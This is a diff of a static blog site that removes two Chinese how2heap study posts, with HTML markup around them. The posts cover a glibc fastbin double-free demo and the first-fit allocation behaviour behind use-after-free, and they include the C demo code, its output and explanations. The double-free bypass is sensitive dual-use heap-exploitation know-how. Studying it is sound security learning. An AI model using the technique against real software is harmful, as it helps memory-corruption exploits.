-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/how2heap/" itemprop="url" rel="index">
-                    <span itemprop="name">how2heap</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include stdio.h</span></span><br><span class="line"><span class="comment">#include stdlib.h</span></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, This file demonstrates a simple double-free attack with fastbins.n);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, Allocating 3 buffers.n);</span><br><span class="line">	int a = malloc(8);</span><br><span class="line">	int b = malloc(8);</span><br><span class="line">	int c = malloc(8);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, 1st malloc(8) %pn, a);</span><br><span class="line">	fprintf(stderr, 2nd malloc(8) %pn, b);</span><br><span class="line">	fprintf(stderr, 3rd malloc(8) %pn, c);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, Freeing the first one...n);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, If we free %p again, things will crash because %p is at the top of the free list.n, a, a);</span><br><span class="line">	 free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, So, instead, we<span class="string">'ll free %p.n, b);</span></span><br><span class="line"><span class="string">	free(b);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	fprintf(stderr, Now, we can free %p again, since it'</span>s not the head of the free list.n, a);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, Now the free list has [ %p, %p, %p ]. If we malloc 3 <span class="built_in">times</span>, we<span class="string">'ll get %p twice!n, a, b, a, a);</span></span><br><span class="line"><span class="string">	fprintf(stderr, 1st malloc(8) %pn, malloc(8));</span></span><br><span class="line"><span class="string">	fprintf(stderr, 2nd malloc(8) %pn, malloc(8));</span></span><br><span class="line"><span class="string">	fprintf(stderr, 3rd malloc(8) %pn, malloc(8));</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0xb74010</span><br><span class="line">2nd malloc(8): 0xb74030</span><br><span class="line">3rd malloc(8): 0xb74050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0xb74010 again, things will crash because 0xb74010 is at the top of the free list.</span><br><span class="line">*** Error <span class="keyword">in</span> `./fastbin_dup_double_free<span class="string">': double free or corruption (fasttop): 0x0000000000b74010 ***</span></span><br><span class="line"><span class="string">======= Backtrace: =========</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(+0x790cb)[0x7fe7c6e7d0cb]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(+0x82c9a)[0x7fe7c6e86c9a]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fe7c6e8ad8c]</span></span><br><span class="line"><span class="string">./fastbin_dup_double_free[0x400740]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf1)[0x7fe7c6e243f1]</span></span><br><span class="line"><span class="string">./fastbin_dup_double_free[0x40054a]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">当我们运行程序后，程序发生了明显的报错，这是一个典型的 double free 。意味通常而言，一个已经 free 掉的 chunk 是不能被 free 第二次的。然后我们把原本的注释加上。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">首先 程序malloc了三个chunk</span></span><br><span class="line"><span class="string">然后free(a)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">printf(stderr, 3rd malloc(8) %pn, c);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	fprintf(stderr, Freeing the first one...n);</span></span><br><span class="line"><span class="string">	free(a);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	fprintf(stderr, If we free %p again, things will crash because %p is at the top of the free list.n, a, a);</span></span><br><span class="line"><span class="string">	 free(a);##这个free(a)是不行的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">然后free(b) free(a)</span></span><br><span class="line"><span class="string">	fprintf(stderr, So, instead, we'</span>ll free %p.n, b);</span><br><span class="line">	free(b);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, Now, we can free %p again, since it<span class="string">'s not the head of the free list.n, a);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	这个时候，fastbin 形成一个 fastbin freelist</span></span><br><span class="line"><span class="string">	chunk A ---&gt; chunk B</span></span><br><span class="line"><span class="string"> 然后我们再把 a free 一次</span></span><br><span class="line"><span class="string"> free(a);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	fprintf(stderr, Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'</span>ll get %p twice!n, a, b, a, a);</span><br><span class="line">	fprintf(stderr, 1st malloc(8) %pn, malloc(8));</span><br><span class="line">	fprintf(stderr, 2nd malloc(8) %pn, malloc(8));</span><br><span class="line">	fprintf(stderr, 3rd malloc(8) %pn, malloc(8));</span><br><span class="line"></span><br><span class="line">	|Chunk A| -&gt; |chunk B| --&gt;| chunk A|</span><br></pre></td></tr></table></figure>
-
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbins 可以看成一个 LIFO 的栈，使用单链表实现，通过 fastbin-&gt;fd 来遍历 fastbins。由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同一个 chunk，所以这里在两次 free 之间，增加了一次对其他 chunk 的 free 过程，从而绕过检查顺利执行。然后再 malloc 三次，就在同一个地址 malloc 了两次，也就有了两个指向同一块内存区域的指针。</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/02/first_fit.c/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xfgg">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xfgg">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/02/first_fit.c/" itemprop="url">first_fit</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-02T07:36:00+08:00">
-                2019-08-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/how2heap/" itemprop="url" rel="index">
-                    <span itemprop="name">how2heap</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>堆的系统学习</p>
-<h3 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, <span class="string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line">	fprintf(stderr, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line">	fprintf(stderr, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line">	fprintf(stderr, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line">	char* a = malloc(512);</span><br><span class="line">	char* b = malloc(256);</span><br><span class="line">	char* c;</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line">	fprintf(stderr, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line">	fprintf(stderr, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line">	fprintf(stderr, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line">	strcpy(a, <span class="string">"this is A!"</span>);</span><br><span class="line">	fprintf(stderr, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"So, let's allocate 500 bytes\n"</span>);</span><br><span class="line">	c = malloc(500);</span><br><span class="line">	fprintf(stderr, <span class="string">"3rd malloc(500): %p\n"</span>, c);</span><br><span class="line">	fprintf(stderr, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line">	strcpy(c, <span class="string">"this is C!"</span>);</span><br><span class="line">	fprintf(stderr, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line">	fprintf(stderr, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">	fprintf(stderr, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">执行程序后的输出</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">This file doesn<span class="string">'t demonstrate an attack, but shows the nature of glibc'</span>s allocator.</span><br><span class="line">glibc uses a first-fit algorithm to select a free chunk.</span><br><span class="line">If a chunk is free and large enough, malloc will select this chunk.</span><br><span class="line">This can be exploited <span class="keyword">in</span> a use-after-free situation.</span><br><span class="line">Allocating  buffers. They can be large, don<span class="string">'t have to be fastbin.</span></span><br><span class="line"><span class="string">1st ): 0x245b420</span></span><br><span class="line"><span class="string">2nd ): 0x245b630</span></span><br><span class="line"><span class="string">we could continue mallocing here...</span></span><br><span class="line"><span class="string">now let'</span>s put a string at a that we can <span class="built_in">read</span> later <span class="string">"this is A!"</span></span><br><span class="line">first allocation 0x245b420 points to this is A!</span><br><span class="line">Freeing the first one...</span><br><span class="line">We don<span class="string">'t need to free anything again. As long as we allocate less than 512, it will end up at 0x245b420</span></span><br><span class="line"><span class="string">So, let'</span>s allocate 500 bytes</span><br><span class="line">3rd ): 0x245b420</span><br><span class="line">And put a different string here, <span class="string">"this is C!"</span></span><br><span class="line">3rd allocation 0x245b420 points to this is C!</span><br><span class="line">first allocation 0x245b420 points to this is C!</span><br><span class="line">If we reuse the first allocation, it now holds the data from the third allocation.</span><br><span class="line"></span><br><span class="line">这个案例只是讲了glibc分配chunk时的first fit原则,可以用于use after free漏洞,比较简单,对照看看源码和输出即可,</span><br><span class="line"></span><br><span class="line">我的理解是 free(a)之后a的指针空闲了出来 除非字节大于512 不然还是输出a的值 0x245b420，c字节为500，所以还是输出0x245b420</span><br></pre></td></tr></table></figure>
-
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</span><br><span class="line">释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于top chunk的解释，请参考下面的介绍。</span><br><span class="line">当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</span><br><span class="line"></span><br><span class="line">Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取。</span><br><span class="line">在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</span><br><span class="line"></span><br><span class="line">uaf 造成原因：</span><br><span class="line"></span><br><span class="line">​ 指针free 掉后并没有置0</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1763,7 +1764,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-count">34</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1774,7 +1775,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
